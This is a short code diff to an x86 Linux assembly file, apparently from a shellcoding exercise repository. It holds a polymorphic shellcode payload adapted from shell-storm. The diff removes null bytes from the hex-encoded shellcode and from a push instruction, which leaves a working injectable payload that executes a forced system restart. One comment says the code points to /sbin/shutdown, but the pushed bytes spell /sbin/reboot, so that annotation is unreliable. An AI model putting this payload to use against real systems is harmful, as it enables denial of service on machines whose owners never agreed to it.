@@ -3,7 +3,7 @@
 ; Website:  http://github.com/14deep
 ; Purpose:  Polymorphic version of shutdown shellcode from shell-storm
 ; 	    www.shell-storm.org/shellcode/files/shellcode-831.php
-; Shellcode : "\x31\xd2\x52\xb8\x62\x6f\x6f\x74\x50\xb8\x6e\x2f\x72\x65\x50\xb8\x2f\x73\x62\x69\x50\x89\xe3\x52\x68\x2d\x66\x00\x00\x89\xe1\x52\x51\x53\x89\xe1\xf7\xe2\xb0\x0b\xcd\x80"
+; Shellcode : "\x31\xd2\x52\xb8\x62\x6f\x6f\x74\x50\xb8\x6e\x2f\x72\x65\x50\xb8\x2f\x73\x62\x69\x50\x89\xe3\x52\x66\x68\x2d\x66\x89\xe1\x52\x51\x53\x89\xe1\xf7\xe2\xb0\x0b\xcd\x80"
 
 
 global _start			
@@ -25,7 +25,7 @@ push eax
 mov ebx, esp   ; stack pointer to ebx pointing to /sbin/shutdown
 push edx       ; push edx to stack (0)
 
-push 0x662d    ; pushw - push '-f' to stack
+push word 0x662d ; pushw - push '-f' to stack
 mov ecx, esp   ; move stack pointer to esi pointing to -f on the stack
 push edx       ; push edx to stack (0)
 push ecx       ; push ecx to stack, pointer to -f
